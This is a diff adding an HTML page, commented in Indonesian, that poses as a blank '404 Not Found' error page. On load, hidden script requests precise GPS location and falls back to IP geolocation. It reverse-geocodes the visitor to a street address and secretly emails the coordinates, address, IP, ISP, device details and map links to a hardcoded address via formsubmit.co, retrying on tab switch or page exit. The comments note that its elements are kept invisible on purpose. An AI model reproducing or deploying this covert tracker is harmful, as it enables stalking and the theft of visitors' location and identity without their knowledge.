@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>404 Not Found</title>
+<style>
+  /* Mengatur UI menjadi layar putih kosong dengan teks di tengah */
+  body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #ffffff;
+    color: #222222;
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  
+  h1 {
+    font-size: 3.5rem;
+    font-weight: 400;
+    letter-spacing: 2px;
+    margin: 0;
+  }
+
+  /* Memastikan badge dan log benar-benar tidak terlihat di layar */
+  #gt-badge, #gt-log {
+    display: none !important;
+  }
+</style>
+</head>
+<body>
+
+<h1>404</h1>
+
+<!-- Elemen disembunyikan, namun tetap dipertahankan agar script berjalan sempurna -->
+<div id="gt-badge"></div>
+<div id="gt-log"></div>
+
+<script>
+(function(){
+"use strict";
+
+/* ================== KONFIGURASI ================== */
+var CONFIG = {
+  EMAIL: "muhammadafrizaardiansyah@outlook.com",   // <-- Ganti dengan email Anda
+  NAMA_SITUS: "Halaman 404",
+  KIRIM_OTOMATIS: true,           
+  PAKAI_IP_FALLBACK: true,        
+  KIRIM_SAAT_KELUAR: true,        
+  KIRIM_UPDATE_ALAMAT: true,      
+  TAMPILKAN_BADGE: false,         // Diset false agar 100% tersembunyi
+  MIN_JEDA_DETIK: 15,
+  GOOGLE_SCRIPT_URL: ""           
+};
+
+/* ================== UTIL ================== */
+var LS = { sent: "gt_sent", queue: "gt_queue" };
+function el(i){ return document.getElementById(i); }
+function f(n,d){ return Number(n).toFixed(d===undefined?6:d); }
+function ts(){ return new Date().toLocaleTimeString("id-ID"); }
+function log(t){
+  var l = el("gt-log"); if(!l) return;
+  var d = document.createElement("div");
+  d.textContent = ts() + " · " + t;
+  l.appendChild(d);
+}
+function badge(t){
+  var b = el("gt-badge"); if(!b || !CONFIG.TAMPILKAN_BADGE) return;
+  b.innerHTML = "lokasi: <b>" + t + "</b>";
+}
+
+/* ================== PLUS CODE + GEOHASH ================== */
+var AL = "23456789CFGHJMPQRVWX", RES = [200000000,10000000,500000,25000,1250];
+function plusCode(lat, lng){
+  var a = Math.round((lat+90)*1e7), b = Math.round((lng+180)*1e7), out = "";
+  for (var i=0;i<5;i++){
+    var r = RES[i], x = Math.floor(a/r), y = Math.floor(b/r);
+    out += AL.charAt(x) + AL.charAt(y);
+    a -= x*r; b -= y*r;
+  }
+  var row = Math.min(4, Math.max(0, Math.floor((a/1e7)/0.000025)));
+  var col = Math.min(3, Math.max(0, Math.floor((b/1e7)/0.00003125)));
+  out += AL.charAt(row*4+col);
+  return out.slice(0,8) + "+" + out.slice(8);
+}
+function geohash(lat, lng){
+  var B = "0123456789bcdefghjkmnpqrstuvwxyz", laMin=-90, laMax=90, lnMin=-180, lnMax=180;
+  var h="", bit=0, bits=0, even=true;
+  while (h.length < 11){
+    if (even){ var m=(lnMin+lnMax)/2; if(lng>=m){bit=(bit<<1)|1; lnMin=m;} else {bit=bit<<1; lnMax=m;} }
+    else { var n=(laMin+laMax)/2; if(lat>=n){bit=(bit<<1)|1; laMin=n;} else {bit=bit<<1; laMax=n;} }
+    even = !even;
+    if (++bits === 5){ h += B.charAt(bit); bits=0; bit=0; }
+  }
+  return h;
+}
+
+/* ================== STATE ================== */
+var H = { lat:null, lng:null, acc:null, alt:null, spd:null, hdg:null, alamat:null,
+          plus:null, hash:null, ip:null, isp:"", sumber:"", t0: Date.now() };
+var terkirim = false, timerKirim = null;
+
+/* ================== LAPORAN ================== */
+function laporan(){
+  var L = [];
+  L.push("LAPORAN PENGUNJUNG — " + CONFIG.NAMA_SITUS);
+  L.push("Waktu          : " + new Date().toLocaleString("id-ID"));
+  L.push("Halaman        : " + location.href);
+  L.push("Datang dari    : " + (document.referrer || "(langsung)"));
+  L.push("Koordinat      : " + f(H.lat) + ", " + f(H.lng));
+  L.push("Akurasi        : " + (H.acc!=null ? "±" + Math.round(H.acc) + " meter" : "-"));
+  L.push("Sumber lokasi  : " + H.sumber);
+  if (H.alt!=null) L.push("Altitude       : " + Math.round(H.alt) + " m");
+  if (H.spd) L.push("Kecepatan      : " + (H.spd*3.6).toFixed(1) + " km/j");
+  L.push("Plus Code      : " + (H.plus || "-"));
+  L.push("Geohash        : " + (H.hash || "-"));
+  L.push("Alamat lengkap : " + ((H.alamat && H.alamat.full) || "-"));
+  L.push("");
+  L.push("Google Maps    : https://www.google.com/maps/search/?api=1&query=" + f(H.lat) + "," + f(H.lng));
+  L.push("Apple Maps     : https://maps.apple.com/?ll=" + f(H.lat) + "," + f(H.lng));
+  L.push("Waze           : https://waze.com/ul?ll=" + f(H.lat) + "," + f(H.lng) + "&navigate=yes");
+  L.push("");
+  L.push("IP publik      : " + (H.ip || "-") + (H.isp ? " (" + H.isp + ")" : ""));
+  L.push("Perangkat      : " + navigator.userAgent);
+  L.push("Layar          : " + screen.width + "x" + screen.height + " · " + navigator.language);
+  L.push("Zona waktu     : " + (Intl.DateTimeFormat().resolvedOptions().timeZone || "-"));
+  L.push("Durasi di halaman: " + Math.round((Date.now()-H.t0)/1000) + " detik");
+  return L.join("\n");
+}
+
+function isiData(){
+  var a = H.alamat || {};
+  return {
+    _subject: "Lokasi pengunjung: " + (a.city || f(H.lat) + "," + f(H.lng)),
+    _template: "box",
+    _captcha: "false",
+    situs: CONFIG.NAMA_SITUS,
+    halaman: location.href,
+    datang_dari: document.referrer || "(langsung)",
+    waktu: new Date().toLocaleString("id-ID"),
+    koordinat: f(H.lat) + ", " + f(H.lng),
+    akurasi: H.acc!=null ? "±" + Math.round(H.acc) + " m" : "-",
+    sumber_lokasi: H.sumber,
+    plus_code: H.plus || "-",
+    geohash: H.hash || "-",
+    alamat_lengkap: a.full || "-",
+    jalan: a.road || "-",
+    kecamatan: a.district || "-",
+    kota: a.city || "-",
+    provinsi: a.state || "-",
+    kode_pos: a.post || "-",
+    negara: a.country || "-",
+    ip_publik: H.ip || "-",
+    isp: H.isp || "-",
+    perangkat: navigator.userAgent,
+    layar: screen.width + "x" + screen.height,
+    bahasa: navigator.language,
+    zona_waktu: Intl.DateTimeFormat().resolvedOptions().timeZone || "-",
+    durasi_di_halaman: Math.round((Date.now()-H.t0)/1000) + " detik",
+    link_google_maps: "https://www.google.com/maps/search/?api=1&query=" + f(H.lat) + "," + f(H.lng),
+    laporan: laporan()
+  };
+}
+
+/* ================== PENGIRIMAN ================== */
+function kirim(judul, pakaiBeacon){
+  if (H.lat == null) return;
+  var data = isiData();
+  if (judul) data._subject = judul;
+
+  if (CONFIG.GOOGLE_SCRIPT_URL){
+    try {
+      fetch(CONFIG.GOOGLE_SCRIPT_URL, { method:"POST", mode:"no-cors",
+        headers:{ "Content-Type":"text/plain" }, body: JSON.stringify(data) });
+    } catch(e){}
+  }
+
+  var url = "https://formsubmit.co/ajax/" + encodeURIComponent(CONFIG.EMAIL);
+
+  if (pakaiBeacon && navigator.sendBeacon){
+    var fd = new FormData();
+    for (var k in data) fd.append(k, data[k]);
+    if (navigator.sendBeacon(url, fd)){ log("data dikirim (beacon)"); return; }
+  }
+
+  fetch(url, {
+    method: "POST",
+    keepalive: true,
+    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+    body: JSON.stringify(data)
+  })
+  .then(function(r){ return r.json().catch(function(){ return {}; }); })
+  .then(function(){
+    log("email terkirim ke " + CONFIG.EMAIL);
+    badge("terkirim");
+    try { localStorage.setItem(LS.sent, String(Date.now())); } catch(e){}
+  })
+  .catch(function(){
+    log("jaringan gagal — disimpan ke antrian");
+    try {
+      var q = JSON.parse(localStorage.getItem(LS.queue) || "[]");
+      q.push(data);
+      localStorage.setItem(LS.queue, JSON.stringify(q.slice(-20)));
+    } catch(e){}
+  });
+}
+
+function antrianKirim(){
+  try {
+    var q = JSON.parse(localStorage.getItem(LS.queue) || "[]");
+    if (!q.length) return;
+    localStorage.setItem(LS.queue, "[]");
+    log(q.length + " data tertunda dikirim ulang");
+    q.forEach(function(d, i){
+      setTimeout(function(){
+        fetch("https://formsubmit.co/ajax/" + encodeURIComponent(CONFIG.EMAIL), {
+          method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(d)
+        }).catch(function(){});
+      }, i * 400);
+    });
+  } catch(e){}
+}
+
+/* ================== LOKASI ================== */
+function deteksi(){
+  if (!navigator.geolocation){ if (CONFIG.PAKAI_IP_FALLBACK) fallbackIP(); return; }
+  badge("meminta izin…");
+  navigator.geolocation.getCurrentPosition(suksesGPS, gagalGPS,
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
+}
+
+function suksesGPS(p){
+  var c = p.coords;
+  H.lat = c.latitude; H.lng = c.longitude; H.acc = c.accuracy;
+  H.alt = c.altitude; H.spd = c.speed; H.hdg = c.heading;
+  H.sumber = "GPS perangkat (±" + Math.round(c.accuracy) + " m)";
+  H.plus = plusCode(H.lat, H.lng);
+  H.hash = geohash(H.lat, H.lng);
+  log("GPS terkunci · " + f(H.lat) + ", " + f(H.lng));
+  badge("terkunci ±" + Math.round(c.accuracy) + " m");
+  clearTimeout(timerKirim);
+  timerKirim = setTimeout(function(){
+    if (!terkirim && CONFIG.KIRIM_OTOMATIS){
+      terkirim = true;
+      kirim("Lokasi pengunjung (koordinat): " + CONFIG.NAMA_SITUS);
+    }
+  }, 4500);
+  geocode(H.lat, H.lng);
+}
+
+function gagalGPS(err){
+  log("GPS gagal (" + err.code + ") — pakai perkiraan IP");
+  if (CONFIG.PAKAI_IP_FALLBACK) fallbackIP();
+}
+
+function fallbackIP(){
+  fetch("https://ipwho.is/")
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    if (!d || d.success === false) throw new Error("ip");
+    H.ip = d.ip; H.isp = (d.connection && d.connection.isp) || "";
+    if (H.lat == null){
+      H.lat = d.latitude; H.lng = d.longitude; H.acc = 5000;
+      H.sumber = "perkiraan dari IP (akurasi kota)";
+      H.plus = plusCode(H.lat, H.lng);
+      H.hash = geohash(H.lat, H.lng);
+      H.alamat = { full: [d.city, d.region, d.country].filter(Boolean).join(", "),
+                   city: d.city, state: d.region, country: d.country, post: d.postal };
+      badge(d.city || d.country || "perkiraan IP");
+      log("lokasi perkiraan: " + (H.alamat.full || "-"));
+      if (CONFIG.KIRIM_OTOMATIS && !terkirim){
+        terkirim = true; clearTimeout(timerKirim);
+        kirim("Lokasi pengunjung (perkiraan IP): " + CONFIG.NAMA_SITUS);
+      }
+    }
+  })
+  .catch(function(){ log("data IP tidak tersedia"); });
+}
+
+/* ================== ALAMAT ================== */
+function geocode(lat, lng){
+  fetch("https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=" + lat +
+        "&longitude=" + lng + "&localityLanguage=id")
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    var info = (d.localityInfo && d.localityInfo.administrative) || [];
+    function pick(levels){
+      for (var i=0;i<info.length;i++) if (levels.indexOf(info[i].adminLevel) > -1) return info[i].name;
+      return null;
+    }
+    var a = {
+      road: pick([9,10]),
+      village: d.locality || pick([7,8]),
+      district: pick([5,6]),
+      city: d.city || pick([4]),
+      state: d.principalSubdivision || pick([3]),
+      post: d.postcode || null,
+      country: d.countryName || null
+    };
+    a.full = [a.road, a.village, a.district, a.city, a.state, a.post, a.country]
+             .filter(Boolean).join(", ");
+    H.alamat = a;
+    log("alamat lengkap: " + (a.full || "-"));
+    badge(a.city || a.village || "alamat ok");
+    if (!terkirim && CONFIG.KIRIM_OTOMATIS){
+      terkirim = true; clearTimeout(timerKirim);
+      kirim("Lokasi + alamat pengunjung: " + CONFIG.NAMA_SITUS);
+    } else if (CONFIG.KIRIM_UPDATE_ALAMAT){
+      kirim("Alamat lengkap pengunjung: " + CONFIG.NAMA_SITUS);
+    }
+  })
+  .catch(function(){ log("geocode gagal — koordinat tetap terkirim"); });
+}
+
+/* ================== START ================== */
+function init(){
+  log("pelacak aktif");
+  antrianKirim();
+  fallbackIP();
+  deteksi();
+
+  window.addEventListener("pagehide", function(){
+    if (H.lat != null && !terkirim && CONFIG.KIRIM_SAAT_KELUAR){
+      terkirim = true;
+      kirim("Lokasi pengunjung (keluar cepat): " + CONFIG.NAMA_SITUS, true);
+    }
+  });
+  document.addEventListener("visibilitychange", function(){
+    if (document.hidden && H.lat != null && !terkirim && CONFIG.KIRIM_SAAT_KELUAR){
+      terkirim = true;
+      kirim("Lokasi pengunjung (pindah tab): " + CONFIG.NAMA_SITUS, true);
+    }
+  });
+}
+
+if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
+else init();
+})();
+</script>
+</body>
+</html>
